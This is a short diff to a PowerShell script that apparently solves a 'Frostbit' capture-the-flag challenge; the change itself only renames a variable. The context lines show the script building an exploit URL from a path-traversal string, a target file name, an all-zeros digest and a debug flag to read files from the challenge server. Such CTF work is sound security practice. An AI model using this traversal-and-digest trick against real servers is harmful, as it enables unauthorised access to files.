@@ -126,7 +126,6 @@ if(-not (Is-UUID -InputString $BotUUID)){
     "Error badly formatted BotUUID, you can find yours in the decrypted TLS HTTP pcap data and the frostbit_core_dump file."
     return
 }
-else{$botuuid = $BotUUID}
 
 $nonceregex = '^[0-9a-fA-F]{16}$'
 if($NonceHex -notmatch $nonceregex){
@@ -177,7 +176,7 @@ $url += Escape-StringForURL -inputString "/../../../../.."
 $url += Escape-StringForURL -inputString $file
 
 # botuuid, with all-zeros digest and debug set.
-$url += "/$botuuid/status?digest=00000000000000000000000000000000&debug=true"
+$url += "/$BotUUID/status?digest=00000000000000000000000000000000&debug=true"
 
 "Starting Frostbit CSV Decryption on $(Get-Date)"
 "BotUUID: " + $BotUUID
